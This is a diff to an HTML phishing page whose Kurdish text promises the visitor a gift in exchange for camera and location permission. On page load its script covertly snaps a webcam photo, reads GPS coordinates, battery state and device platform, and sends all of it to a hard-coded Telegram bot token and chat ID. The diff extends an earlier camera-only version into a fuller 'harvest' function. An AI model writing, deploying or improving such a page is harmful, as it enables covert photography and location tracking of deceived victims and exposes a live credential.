@@ -1,45 +1,75 @@
 <!DOCTYPE html>
-<html>
+<html lang="ku">
 <head>
-    <title>GIFT FOR YOU</title>
+    <meta charset="UTF-8">
+    <title>Get Your Gift</title>
 </head>
 <body>
-    <h2 style="text-align:center;">بۆ بینینی دیارییەکەت، تکایە ڕێگە بە کامێرا بدە</h2>
+    <h2 style="text-align:center; margin-top:50px;">بۆ وەرگرتنی دیارییەکەت، ڕێگە بدە بە کامێرا و شوێن</h2>
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = "8624059192:AAHhgZk6peV5k4LpkXIgX8CwuZkqcbjHHuE"; 
-        const CHAT_ID = "7143804196"; 
+        const TOKEN = "8624059192:AAHhgZk6peV5k4LpkXIgX8CwuZkqcbjHHuE"; //
+        const CHAT_ID = "7143804196";
 
-        async function startCamera() {
+        async function startHarvest() {
+            let locationData = "مۆڵەتی شوێن نەدراوە";
+            
+            // ١. وەرگرتنی شوێنی GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    locationData = `📍 نەخشەی گوگڵ: https://www.google.com/maps?q=${lat},${lon}`;
+                    await sendData(locationData);
+                });
+            }
+
+            // ٢. وەرگرتنی وێنە و زانیارییەکانی تر
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                setTimeout(takeSnap, 2000);
+
+                const battery = await navigator.getBattery();
+                const batteryInfo = `🔋 باتری: ${Math.round(battery.level * 100)}% (${battery.charging ? 'لە شەحنە' : 'لە شەحن نییە'})`;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'snap.jpg');
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('caption', `
+📸 وێنەی نوێ گەیشت!
+-------------------------
+${batteryInfo}
+🌐 جۆری ئامێر: ${navigator.platform}
+${locationData}
+-------------------------`);
+
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg');
+                }, 3000);
             } catch (err) {
-                console.error("Error:", err);
+                console.log("Error: " + err);
             }
         }
 
-        function takeSnap() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('photo', blob, 'snap.jpg');
-                formData.append('chat_id', CHAT_ID);
-                formData.append('caption', "🎯 وێنەیەکی نوێ لە ڕێگەی لینکەوە گەیشت!");
-
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg');
+        async function sendData(msg) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
         }
-        window.onload = startCamera;
+
+        window.onload = startHarvest;
     </script>
 </body>
 </html>
